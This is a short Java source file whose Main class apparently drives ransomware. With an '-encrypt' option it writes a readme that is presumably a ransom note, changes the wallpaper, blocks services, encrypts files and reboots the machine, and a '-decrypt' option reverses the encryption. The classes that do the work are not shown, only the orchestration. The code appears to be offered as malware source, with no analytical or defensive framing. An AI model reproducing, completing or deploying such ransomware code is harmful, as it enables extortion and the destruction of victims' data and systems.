package kr.pah;

public class Main {
    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            return;
        }

        String option = args[0];

        if (option.equals("-encrypt")) {
            CreateReadme.main();
            WallpaperChanger.main();
            ServiceBlock.blockAll();
            Encrypt.runEncryption();
            SystemReboot.main();
        } else if (option.equals("-decrypt")) {
            Decrypt.runDecryption();
        } else {
            System.out.println("Invalid option: " + option);
        }
    }
}